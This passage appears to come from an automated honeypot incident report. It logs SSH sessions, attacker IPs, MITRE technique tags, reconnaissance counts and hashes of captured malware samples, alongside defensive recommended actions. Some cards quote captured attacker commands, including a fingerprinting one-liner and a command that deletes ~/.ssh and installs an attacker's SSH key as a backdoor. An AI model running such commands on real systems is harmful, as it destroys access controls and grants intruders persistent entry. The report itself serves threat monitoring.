**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 06:22:26` | `cowrie.session.connect` |
| `2026-09-08 06:22:26` | `cowrie.client.version` |
| `2026-09-08 06:22:26` | `cowrie.client.kex` |
| `2026-09-08 06:22:26` | `cowrie.login.success` |
| `2026-09-08 06:22:27` | `cowrie.session.params` |
| `2026-09-08 06:22:27` | `cowrie.command.input` |
| `2026-09-08 06:22:27` | `cowrie.log.closed` |
| `2026-09-08 06:22:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ed615d971ac

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-09-08 06:24 |
| **Last Seen** | 2026-09-08 06:24 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 06:24:17` | `cowrie.session.connect` |
| `2026-09-08 06:24:17` | `cowrie.client.version` |
| `2026-09-08 06:24:17` | `cowrie.client.kex` |
| `2026-09-08 06:24:18` | `cowrie.login.success` |
| `2026-09-08 06:24:19` | `cowrie.session.params` |
| `2026-09-08 06:24:19` | `cowrie.command.input` |
| `2026-09-08 06:24:19` | `cowrie.log.closed` |
| `2026-09-08 06:24:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5b1d88ca074e

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-09-08 06:26 |
| **Last Seen** | 2026-09-08 06:26 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 06:26:19` | `cowrie.session.connect` |
| `2026-09-08 06:26:19` | `cowrie.client.version` |
| `2026-09-08 06:26:19` | `cowrie.client.kex` |
| `2026-09-08 06:26:20` | `cowrie.login.success` |
| `2026-09-08 06:26:21` | `cowrie.session.params` |
| `2026-09-08 06:26:21` | `cowrie.command.input` |
| `2026-09-08 06:26:21` | `cowrie.log.closed` |
| `2026-09-08 06:26:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c968b4e5ed5f

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-09-08 06:28 |
| **Last Seen** | 2026-09-08 06:28 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 06:28:26` | `cowrie.session.connect` |
| `2026-09-08 06:28:26` | `cowrie.client.version` |
| `2026-09-08 06:28:26` | `cowrie.client.kex` |
| `2026-09-08 06:28:27` | `cowrie.login.success` |
| `2026-09-08 06:28:28` | `cowrie.session.params` |
| `2026-09-08 06:28:28` | `cowrie.command.input` |
| `2026-09-08 06:28:29` | `cowrie.log.closed` |
| `2026-09-08 06:28:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e9b6d0d9c424

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-09-08 06:29 |
| **Last Seen** | 2026-09-08 06:30 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 06:29:58` | `cowrie.session.connect` |
| `2026-09-08 06:29:58` | `cowrie.client.version` |
| `2026-09-08 06:29:58` | `cowrie.client.kex` |
| `2026-09-08 06:29:59` | `cowrie.login.success` |
| `2026-09-08 06:30:00` | `cowrie.session.params` |
| `2026-09-08 06:30:00` | `cowrie.command.input` |
| `2026-09-08 06:30:01` | `cowrie.log.closed` |
| `2026-09-08 06:30:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ddda5c35316a

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-09-08 06:45 |
| **Last Seen** | 2026-09-08 06:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 06:45:37` | `cowrie.session.connect` |
| `2026-09-08 06:45:37` | `cowrie.client.version` |
| `2026-09-08 06:45:37` | `cowrie.client.kex` |
| `2026-09-08 06:45:38` | `cowrie.login.success` |
| `2026-09-08 06:45:38` | `cowrie.direct-tcpip.request` |
| `2026-09-08 06:45:38` | `cowrie.direct-tcpip.data` |
| `2026-09-08 06:45:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-afb0068d5a67

| Field | Detail |
|---|---|
| **Source IP** | `107.189.27[.]179` |
| **First Seen** | 2026-09-08 06:46 |
| **Last Seen** | 2026-09-08 06:46 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 06:46:08` | `cowrie.session.connect` |
| `2026-09-08 06:46:08` | `cowrie.client.version` |
| `2026-09-08 06:46:08` | `cowrie.client.kex` |
| `2026-09-08 06:46:08` | `cowrie.login.success` |
| `2026-09-08 06:46:09` | `cowrie.session.params` |
| `2026-09-08 06:46:09` | `cowrie.command.input` |
| `2026-09-08 06:46:09` | `cowrie.command.failed` |
| `2026-09-08 06:46:09` | `cowrie.log.closed` |
| `2026-09-08 06:46:10` | `cowrie.session.params` |
| `2026-09-08 06:46:10` | `cowrie.command.input` |
| `2026-09-08 06:46:10` | `cowrie.session.file_download` |
| `2026-09-08 06:46:10` | `cowrie.log.closed` |
| `2026-09-08 06:46:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.189.27[.]179` to AbuseIPDB if not already reported
- [ ] Block `107.189.27[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ae85ed018183

| Field | Detail |
|---|---|
| **Source IP** | `107.189.27[.]179` |
| **First Seen** | 2026-09-08 06:46 |
| **Last Seen** | 2026-09-08 06:46 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 06:46:10` | `cowrie.session.connect` |
| `2026-09-08 06:46:10` | `cowrie.client.version` |
| `2026-09-08 06:46:10` | `cowrie.client.kex` |
| `2026-09-08 06:46:10` | `cowrie.login.success` |
| `2026-09-08 06:46:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.189.27[.]179` to AbuseIPDB if not already reported
- [ ] Block `107.189.27[.]179` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e7a4b45fae63

| Field | Detail |
|---|---|
| **Source IP** | `107.189.27[.]179` |
| **First Seen** | 2026-09-08 06:46 |
| **Last Seen** | 2026-09-08 06:46 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 06:46:11` | `cowrie.session.connect` |
| `2026-09-08 06:46:11` | `cowrie.client.version` |
| `2026-09-08 06:46:11` | `cowrie.client.kex` |
| `2026-09-08 06:46:11` | `cowrie.login.success` |
| `2026-09-08 06:46:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.189.27[.]179` to AbuseIPDB if not already reported
- [ ] Block `107.189.27[.]179` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d43ae65cbf4f

| Field | Detail |
|---|---|
| **Source IP** | `45.79.172[.]21` |
| **First Seen** | 2026-09-08 06:53 |
| **Last Seen** | 2026-09-08 06:53 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0[.]0 Safari/537.36, Accept: */*, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 06:53:35` | `cowrie.session.connect` |
| `2026-09-08 06:53:35` | `cowrie.login.success` |
| `2026-09-08 06:53:35` | `cowrie.session.params` |
| `2026-09-08 06:53:35` | `cowrie.command.input` |
| `2026-09-08 06:53:35` | `cowrie.command.input` |
| `2026-09-08 06:53:35` | `cowrie.command.failed` |
| `2026-09-08 06:53:35` | `cowrie.command.input` |
| `2026-09-08 06:53:35` | `cowrie.command.failed` |
| `2026-09-08 06:53:35` | `cowrie.command.input` |
| `2026-09-08 06:53:35` | `cowrie.log.closed` |
| `2026-09-08 06:53:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.79.172[.]21` to AbuseIPDB if not already reported
- [ ] Block `45.79.172[.]21` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `34.34.185[.]242` | **29** | 2026-09-08 04:50 | 2026-09-08 04:50 | 4m | 0 | `T1592` | 🟠 MEDIUM |
| `34.52.182[.]122` | **29** | 2026-09-08 04:16 | 2026-09-08 04:16 | 1m | 0 | `T1592` | 🟠 MEDIUM |
| `34.62.237[.]3` | **29** | 2026-09-08 05:39 | 2026-09-08 05:40 | 5m | 0 | `T1592` | 🟠 MEDIUM |
| `217.60.255[.]130` | **4** | 2026-09-08 03:31 | 2026-09-08 06:12 | 0m | 0 | `T1592` | 🟢 LOW |
| `99.254.23[.]54` | **4** | 2026-09-08 05:24 | 2026-09-08 05:25 | 0m | 0 | `T1592` | 🟢 LOW |
| `139.19.117[.]129` | **3** | 2026-09-08 03:34 | 2026-09-08 05:34 | 0m | 3 | `T1110.001 · T1592` | 🟢 LOW |
| `24.131.215[.]165` | **3** | 2026-09-08 03:09 | 2026-09-08 03:11 | 0m | 0 | `T1592` | 🟢 LOW |
| `182.96.95[.]66` | **2** | 2026-09-08 03:30 | 2026-09-08 03:32 | 2m | 0 | `T1592` | 🟢 LOW |
| `192.155.90[.]220` | **2** | 2026-09-08 06:53 | 2026-09-08 06:53 | 0m | 0 | `T1592` | 🟢 LOW |
| `193.90.12[.]122` | **2** | 2026-09-08 05:56 | 2026-09-08 05:59 | 4m | 0 | `T1592` | 🟢 LOW |
| `195.178.110[.]217` | **2** | 2026-09-08 02:58 | 2026-09-08 03:16 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `92.118.39[.]50` | **2** | 2026-09-08 04:17 | 2026-09-08 04:40 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `102.23.31[.]123` | 1 | 2026-09-08 04:42 | 2026-09-08 04:42 | 0s | 0 | `T1592` | 🟢 LOW |
| `112.31.254[.]122` | 1 | 2026-09-08 04:30 | 2026-09-08 04:32 | 120s | 0 | `T1592` | 🟢 LOW |
| `118.145.238[.]115` | 1 | 2026-09-08 04:20 | 2026-09-08 04:22 | 120s | 0 | `T1592` | 🟢 LOW |
| `121.202.148[.]19` | 1 | 2026-09-08 05:32 | 2026-09-08 05:34 | 120s | 0 | `T1592` | 🟢 LOW |
| `124.174.51[.]228` | 1 | 2026-09-08 06:11 | 2026-09-08 06:11 | 0s | 0 | `T1592` | 🟢 LOW |
| `130.12.180[.]174` | 1 | 2026-09-08 03:20 | 2026-09-08 03:20 | 0s | 0 | `T1592` | 🟢 LOW |
| `130.12.180[.]174` | 1 | 2026-09-08 05:37 | 2026-09-08 05:37 | 0s | 0 | `T1592` | 🟢 LOW |
| `14.103.117[.]88` | 1 | 2026-09-08 04:19 | 2026-09-08 04:21 | 120s | 0 | `T1592` | 🟢 LOW |
| `162.255.112[.]183` | 1 | 2026-09-08 06:50 | 2026-09-08 06:50 | 11s | 0 | `T1592` | 🟢 LOW |
| `176.32.193[.]16` | 1 | 2026-09-08 06:19 | 2026-09-08 06:19 | 2s | 0 | `T1592` | 🟢 LOW |
| `182.244.5[.]153` | 1 | 2026-09-08 05:34 | 2026-09-08 05:36 | 120s | 0 | `T1592` | 🟢 LOW |
| `185.242.226[.]17` | 1 | 2026-09-08 06:23 | 2026-09-08 06:23 | 10s | 0 | `T1592` | 🟢 LOW |
| `192.248.150[.]180` | 1 | 2026-09-08 05:32 | 2026-09-08 05:32 | 0s | 0 | `T1592` | 🟢 LOW |
| `192.253.248[.]251` | 1 | 2026-09-08 05:01 | 2026-09-08 05:01 | 0s | 0 | `T1592` | 🟢 LOW |
| `200.112.142[.]50` | 1 | 2026-09-08 05:54 | 2026-09-08 05:54 | 10s | 0 | `T1592` | 🟢 LOW |
| `200.59.127[.]216` | 1 | 2026-09-08 04:17 | 2026-09-08 04:18 | 10s | 0 | `T1592` | 🟢 LOW |
| `200.81.189[.]44` | 1 | 2026-09-08 06:53 | 2026-09-08 06:53 | 11s | 0 | `T1592` | 🟢 LOW |
| `45.33.109[.]18` | 1 | 2026-09-08 06:42 | 2026-09-08 06:42 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.33.14[.]5` | 1 | 2026-09-08 05:47 | 2026-09-08 05:47 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.172[.]21` | 1 | 2026-09-08 06:53 | 2026-09-08 06:53 | 0s | 0 | `T1592` | 🟢 LOW |
| `51.182.156[.]105` | 1 | 2026-09-08 03:24 | 2026-09-08 03:24 | 13s | 0 | `T1592` | 🟢 LOW |
| `58.221.60[.]25` | 1 | 2026-09-08 03:46 | 2026-09-08 03:48 | 120s | 0 | `T1592` | 🟢 LOW |
| `62.60.130[.]242` | 1 | 2026-09-08 04:08 | 2026-09-08 04:08 | 1s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]107` | 1 | 2026-09-08 05:23 | 2026-09-08 05:23 | 2s | 0 | `T1592` | 🟢 LOW |
| `65.49.1[.]122` | 1 | 2026-09-08 04:54 | 2026-09-08 04:54 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]195` | 1 | 2026-09-08 06:01 | 2026-09-08 06:02 | 18s | 0 | `T1592` | 🟢 LOW |
| `66.132.224[.]236` | 1 | 2026-09-08 03:22 | 2026-09-08 03:22 | 15s | 0 | `T1592` | 🟢 LOW |
| `66.240.223[.]240` | 1 | 2026-09-08 05:31 | 2026-09-08 05:32 | 10s | 0 | `T1592` | 🟢 LOW |
| `68.183.105[.]175` | 1 | 2026-09-08 05:14 | 2026-09-08 05:14 | 0s | 0 | `T1592` | 🟢 LOW |
| `69.164.217[.]245` | 1 | 2026-09-08 04:49 | 2026-09-08 04:49 | 0s | 0 | `T1592` | 🟢 LOW |
| `84.54.71[.]157` | 1 | 2026-09-08 05:25 | 2026-09-08 05:25 | 0s | 0 | `T1592` | 🟢 LOW |
| `94.154.43[.]69` | 1 | 2026-09-08 04:20 | 2026-09-08 04:21 | 30s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `00deea7003eef2f30f2c84d1497a42c1f375d802ddd17bde455d5fde2a63631f` | ELF Binary (Linux executable) (x86-64 64-bit) | `00deea7003eef2f3...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `04fcb4584d4de9deb015261bed95adfe0ac7e399503cff848908c1675e196148` | Bash Script | `04fcb4584d4de9de...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `06901d0a279cc5a062c5de6903102edbcface166424935b01d984580c3d7a928` | Bash Script | `06901d0a279cc5a0...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `072cdf382cce83bc1a59d196a09b6dd1beca38a7a697f30f826633c836952442` | Bash Script | `072cdf382cce83bc...` | 57/100 | 🟡 MEDIUM | **19/75** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `13960b7e69159907f67f84ce6398d29f73686602ef2c36d837237288f4fe8785` | Bash Script | `13960b7e69159907...` | 58/100 | 🟡 MEDIUM | **20/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **31/70** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **27/75** 🔴 |
| `1bc1c784057dc4e36fcc913fe03b1f0cae8474063b486ae3443b9ef8bced9548` | Bash Script | `1bc1c784057dc4e3...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `1bd3745a4f9043ead807d7777669b0dbf5b56985e5b3dd9d7cff8384154ea4a8` | ELF Binary (Linux executable) (x86-64 64-bit) | `1bd3745a4f9043ea...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` | Shell Script | `1d64be0ba1bd9924...` | 72/100 | 🔴 HIGH | **7/75** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 38/100 | 🟢 LOW | **21/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
